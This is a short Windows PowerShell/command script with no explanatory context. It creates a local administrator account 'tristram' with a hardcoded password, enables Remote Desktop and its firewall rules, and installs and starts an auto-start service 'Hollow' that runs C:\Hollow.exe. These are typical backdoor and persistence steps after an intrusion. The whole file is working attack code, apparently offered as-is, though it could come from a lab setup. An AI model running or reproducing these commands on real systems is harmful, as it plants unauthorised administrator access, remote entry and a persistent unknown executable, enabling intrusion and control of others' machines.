# Create new local administrator
net user tristram Fall2023! /add
net localgroup administrators tristram /add

# Enable terminal services if it's currently disabled
$RDP = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections"
if ($RDP.fDenyTSConnections -eq 1) {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
    netsh advfirewall firewall set rule group='remote desktop' new enable=Yes
} 

# Create Hollow service and start it
C:\Windows\System32\sc.exe create Hollow binPath="C:\Hollow.exe" start= auto
C:\Windows\System32\sc.exe start Hollow
